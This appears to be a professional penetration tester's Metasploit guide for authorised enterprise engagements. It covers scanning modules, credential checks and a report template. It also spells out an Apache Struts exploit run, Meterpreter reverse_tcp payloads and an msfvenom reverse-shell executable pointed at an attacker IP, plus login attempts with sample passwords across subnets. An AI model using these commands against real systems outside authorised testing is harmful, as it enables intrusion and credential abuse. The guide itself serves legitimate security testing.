# Metasploit Framework — Enterprise Penetration Testing Usage Guide

> **Author:** Dheeraj Kumar Jayaswal — Senior Penetration Tester | 6+ Years Enterprise AppSec
>
> **Category:** Tool Mastery — Vulnerability Exploitation Framework
>
> **Context:** Metasploit's role in professional enterprise penetration testing is narrower and more deliberate than beginners expect. I do not use Metasploit to discover vulnerabilities — Burp Suite, Nmap, and manual testing do that. I use Metasploit to safely and reliably confirm that a discovered vulnerability is exploitable in the specific target environment, and to generate professional proof-of-concept evidence. The emphasis is always on confirmation, documentation, and staying within engagement boundaries.

---

## 🧠 Professional Metasploit Philosophy

```
What Metasploit IS used for in enterprise engagements:
  ✓ Confirming exploitability of identified CVEs on discovered versions
  ✓ Auxiliary modules for service enumeration and verification
  ✓ Safe exploitation PoC with controlled payloads (reverse shell to own listener)
  ✓ Post-exploitation only when explicitly authorised and scoped
  ✓ Credential validation across discovered services

What Metasploit is NOT used for:
  ✗ Spray-and-pray exploitation without prior manual confirmation
  ✗ Lateral movement without explicit written authorisation
  ✗ Persistence mechanisms on client systems
  ✗ Data exfiltration beyond PoC evidence capture
  ✗ Automated exploitation without understanding the module

The professional rule: understand what a module does before you run it.
Read the module source. Know what it writes, what it opens, what it cleans up.
```

---

## ⚙️ Initial Setup for Enterprise Engagements

```bash
# Start Metasploit and set up workspace per engagement
msfconsole

# Create a named workspace for the engagement (keeps findings isolated)
msf6 > workspace -a CompanyName_2025

# Import Nmap scan results (from recon phase)
msf6 > db_import /path/to/nmap_scan.xml
msf6 > hosts          # View all discovered hosts
msf6 > services       # View all discovered services
msf6 > vulns          # View any pre-populated vulnerability data

# Connect to PostgreSQL if not running:
# service postgresql start
# msfdb init
```

---

## 🔧 Auxiliary Modules — Service Enumeration & Verification

Auxiliary modules gather information without exploiting — safe to use broadly.

```bash
# HTTP version and banner detection
msf6 > use auxiliary/scanner/http/http_version
msf6 auxiliary> set RHOSTS 10.0.0.0/24
msf6 auxiliary> set THREADS 20
msf6 auxiliary> run

# Identify open directories and sensitive paths
msf6 > use auxiliary/scanner/http/dir_scanner
msf6 auxiliary> set RHOSTS target.company.com
msf6 auxiliary> set DICTIONARY /opt/SecLists/Discovery/Web-Content/common.txt
msf6 auxiliary> run

# Check for Spring Boot Actuator exposure
msf6 > use auxiliary/scanner/http/spring_actuator_enum
msf6 auxiliary> set RHOSTS target.company.com
msf6 auxiliary> run

# SMB version and configuration (internal assessments)
msf6 > use auxiliary/scanner/smb/smb_version
msf6 auxiliary> set RHOSTS 10.0.0.0/24
msf6 auxiliary> set THREADS 10
msf6 auxiliary> run

# Check for EternalBlue/MS17-010 vulnerability (no exploitation)
msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 auxiliary> set RHOSTS 10.0.0.0/24
msf6 auxiliary> run
# Output: "Host is likely VULNERABLE" — document for report WITHOUT exploiting
#         unless exploitation is explicitly in scope

# SSL cipher enumeration
msf6 > use auxiliary/scanner/ssl/openssl_ccs
msf6 auxiliary> set RHOSTS target.company.com
msf6 auxiliary> set RPORT 443
msf6 auxiliary> run

# Redis unauthenticated access check
msf6 > use auxiliary/scanner/redis/redis_server
msf6 auxiliary> set RHOSTS 10.0.0.0/24
msf6 auxiliary> run
# Confirms Redis with no auth — report without extracting data

# Elasticsearch unauthenticated check
msf6 > use auxiliary/scanner/http/elasticsearch
msf6 auxiliary> set RHOSTS 10.0.0.0/24
msf6 auxiliary> set RPORT 9200
msf6 auxiliary> run
```

---

## 💥 Exploitation Modules — When Scope Explicitly Authorises

```bash
# ================================================================
# CRITICAL: Only proceed with exploitation after:
# 1. Written scope explicitly authorises exploitation
# 2. Vulnerability confirmed via auxiliary/manual testing
# 3. PoC goal is clearly defined (gain shell, prove access = stop)
# 4. Emergency stop procedure agreed with client
# ================================================================

# Example: Confirming Apache Struts RCE (CVE-2017-5638)
# Only after: Nmap confirms Struts version, manual confirm done

msf6 > use exploit/multi/http/struts2_content_type_ognl
msf6 exploit> set RHOSTS target.company.com
msf6 exploit> set RPORT 443
msf6 exploit> set SSL true
msf6 exploit> set TARGETURI /struts-app/login.action
msf6 exploit> set LHOST [attacker_IP]      # your IP
msf6 exploit> set LPORT 4444
msf6 exploit> set PAYLOAD cmd/unix/reverse_bash
msf6 exploit> check    # CHECK for vulnerability first — does not exploit
msf6 exploit> run      # Only after check confirms AND scope authorises

# When shell opens — document immediately, then stop:
# whoami           → capture output
# hostname         → capture output
# screenshot       → evidence captured
# exit             → clean up, close session

# For Windows targets — preferred payload for PoC:
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Meterpreter — PoC evidence capture commands only:
meterpreter > getuid          # Document privilege level
meterpreter > sysinfo         # Document system info
meterpreter > screenshot      # Visual evidence
meterpreter > exit            # Clean up immediately
```

---

## 🔐 Credential Validation Modules

```bash
# Validate discovered credentials across services (not brute force)
# Use only with credentials found elsewhere in the engagement

# SSH credential validation
msf6 > use auxiliary/scanner/ssh/ssh_login
msf6 auxiliary> set RHOSTS 10.0.0.0/24
msf6 auxiliary> set USERNAME admin
msf6 auxiliary> set PASSWORD AdminPass2024!
msf6 auxiliary> set STOP_ON_SUCCESS true
msf6 auxiliary> run

# SMB credential validation
msf6 > use auxiliary/scanner/smb/smb_login
msf6 auxiliary> set RHOSTS 10.0.0.0/24
msf6 auxiliary> set SMBUser administrator
msf6 auxiliary> set SMBPass Password123!
msf6 auxiliary> run

# HTTP form credential validation
msf6 > use auxiliary/scanner/http/http_login
msf6 auxiliary> set RHOSTS target.company.com
msf6 auxiliary> set AUTH_URI /admin/login
msf6 auxiliary> set USERNAME admin
msf6 auxiliary> set PASSWORD admin
msf6 auxiliary> run
```

---

## 📊 Useful msfconsole Workflow Commands

```bash
# Search for modules relevant to a CVE or technology
msf6 > search type:exploit name:apache
msf6 > search cve:2021-44228    # Log4Shell
msf6 > search cve:2017-5638     # Struts
msf6 > search name:spring_boot

# Check module details before running
msf6 > info exploit/multi/http/log4shell_header_injection
# Review: Description, References, Required Options, Targets, Author

# Show all required options for current module
msf6 exploit> show options
msf6 exploit> show advanced    # Less common but sometimes critical options

# Save session data and workspace
msf6 > save
msf6 > db_export -f xml /path/to/engagement_backup.xml

# List active sessions
msf6 > sessions -l
msf6 > sessions -i 1    # Interact with session 1

# Generate standalone payload (for PoC demonstration only)
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=[attacker_IP] LPORT=4444 \
  -f exe -o poc_payload.exe
# Note: Use only in isolated test environments with explicit authorisation
```

---

## 📋 Enterprise Report — Metasploit Finding Template

```
Finding Title: Remote Code Execution — Apache Struts CVE-2017-5638

Severity: Critical | CVSS: 10.0

Affected System: legacy-portal.company.internal (10.0.14.88)
Service: Apache Struts 2.3.31 on port 443

Discovery process:
  1. Nmap identified: Apache Struts 2.3.31 from HTTP response headers
  2. CVE cross-reference: 2.3.31 confirmed vulnerable to CVE-2017-5638
  3. Auxiliary module confirmed vulnerability without exploitation:
     msf6 auxiliary > use exploit/multi/http/struts2_content_type_ognl
     msf6 auxiliary > check
     Output: "The target appears to be vulnerable."
  4. Exploitation PoC executed with explicit client authorisation:
     Reverse shell obtained, id command output captured.

Proof of Concept (scoped):
  [Screenshot: meterpreter session — getuid output showing service account]
  Command output: uid=1000(tomcat) gid=1000(tomcat)
  PoC scope: shell obtained, identity confirmed, session terminated.
  No files read, no lateral movement, no persistence.

Business Impact:
  Unauthenticated RCE allows any internet attacker to execute OS commands
  on the application server under the Tomcat service account, accessing
  application source code, configuration files, and internal network services.

Remediation:
  Immediate: Upgrade Apache Struts to 2.5.30+ (latest stable)
  Immediate: Apply network segmentation — legacy-portal should not be
             internet-accessible
  Short-term: Implement WAF rule blocking malicious Content-Type headers
  Long-term: Decommission legacy Struts application — migrate to current stack
```

---

## 🧭 Key Takeaways

**1. Always run `check` before `run` when a module supports it.**
Many Metasploit exploit modules implement a `check` command that confirms vulnerability without exploiting. Use this in production/shared environments — it satisfies the requirement to document exploitability without the risk of service disruption from a live exploit.

**2. Auxiliary modules are the professional's primary Metasploit interface.**
Auxiliary scanner modules (SMB, HTTP, SSH, Redis, Elasticsearch) run checks and gather information without exploiting. These are appropriate in all engagement environments. Exploitation modules are reserved for explicitly authorised scenarios.

**3. Workspaces keep engagements isolated.**
`workspace -a ClientName_2025` creates a separate database namespace. All hosts, services, and credentials discovered are stored under this workspace. Switch between engagements cleanly: `workspace ClientName_2025`. This is basic professional hygiene.

**4. Document what the shell shows — then exit immediately.**
When exploitation is authorised and a shell is obtained, the professional objective is evidence: `getuid`, `hostname`, `sysinfo`, screenshot. Then clean exit. The goal is to prove the vulnerability is exploitable, not to conduct a breach.

---

## 🔗 References
- [Metasploit Documentation](https://docs.metasploit.com)
- [Rapid7 Metasploit Modules](https://www.rapid7.com/db/)
- [Metasploit Unleashed (free course)](https://www.offensive-security.com/metasploit-unleashed/)

---
<div align="center">

*Part of [AppSec From The Trenches](README.md) — Real notes from 6+ years of enterprise penetration testing.*

[![LinkedIn](https://img.shields.io/badge/LinkedIn-Dheeraj%20Kumar%20Jayaswal-0077B5?style=flat-square&logo=linkedin&logoColor=white)](https://linkedin.com/in/dheerajkumarjayaswal)

</div>
